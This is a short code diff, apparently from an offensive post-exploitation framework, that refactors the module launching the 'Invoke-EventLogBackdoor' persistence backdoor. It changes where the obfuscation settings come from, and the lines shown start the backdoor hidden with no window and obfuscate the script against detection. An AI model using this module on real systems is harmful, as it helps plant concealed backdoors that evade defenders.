@@ -1,5 +1,6 @@
 from __future__ import print_function
 
+import pathlib
 import os
 from builtins import object
 from builtins import str
@@ -106,8 +107,8 @@ Invoke-EventLogBackdoor"""
         # set up the start-process command so no new windows appears
         script = "Start-Process -NoNewWindow -FilePath '%s' -ArgumentList '%s'; 'PowerBreach Invoke-EventLogBackdoor started'" % (parts[0], " ".join(parts[1:]))
 
-        if obfuscate:
-            script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
+        if main_menu.obfuscate:
+            script = data_util.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=main_menu.obfuscateCommand)
         script = data_util.keyword_obfuscation(script)
 
         return script
